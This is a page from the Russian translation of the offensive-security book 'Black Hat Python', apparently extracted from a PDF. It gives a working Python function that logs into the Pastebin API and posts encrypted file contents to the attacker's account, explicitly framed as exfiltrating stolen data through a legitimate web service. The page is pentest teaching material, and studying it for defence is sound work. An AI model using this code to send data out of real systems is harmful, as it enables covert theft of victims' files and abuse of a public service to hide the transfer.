# Black Hat Python. Программирование для хакеров и пентестеров — страница 181

Источник: `Black Hat Python. Программирование для хакеров и пентестеров.pdf`

Вывод похищенных данных с помощью веб-сервера   181
Мы импортируем модуль requests для кросс-платформенной функции 
и класс client из win32com для функции, ориентированной на Windows .
Аутентифицируемся на веб-сервере https://pastebin.com/ и загрузим зашифро-
ванную строку . Чтобы выполнить аутентификацию, определим переменные
username, password и api_dev_key .
Итак, мы импортировали нужные модули и определили параметры. Т еперь
напишем кросс-платформенную функцию plain_paste:
def plain_paste(title, contents): 
    login_url = 'https://pastebin.com/api/api_login.php'
    login_data = { 
        'api_dev_key': api_dev_key,
        'api_user_name': username,
        'api_user_password': password,
    }
    r = requests.post(login_url, data=login_data)
    api_user_key = r.text 
    paste_url = 'https://pastebin.com/api/api_post.php' 
    paste_data = {
        'api_paste_name': title,
        'api_paste_code': contents.decode(),
        'api_dev_key': api_dev_key,
        'api_user_key': api_user_key,
        'api_option': 'paste',
        'api_paste_private': 0,
    }
    r = requests.post(paste_url, data=paste_data) 
    print(r.status_code)
    print(r.text)
plain_paste, как и предыдущие почтовые функции, принимает в качестве ар-
гументов имя файла, которое будет играть роль заголовка, и зашифрованное
содержимое . Чтобы опубликовать фрагмент от своего имени, вам нужно
сделать два запроса. Сначала следует послать POST-запрос API login, указав
username, api_dev_key и password . В ответ вы получите ключ api_user_key,
необходимый для публикации фрагмента от своего имени . Второй запрос
будет направлен к API post . У кажите название фрагмента (мы используем
имя файла) и его содержимое, а также свои API-ключи user и dev . Когда
функция завершит работу , войдите в свою учетную запись на сайте https://
pastebin.com/  — вы должны увидеть свои зашифрованные данные. Можете
скачать этот фрагмент на своей информационной панели для последующей
расшифровки.
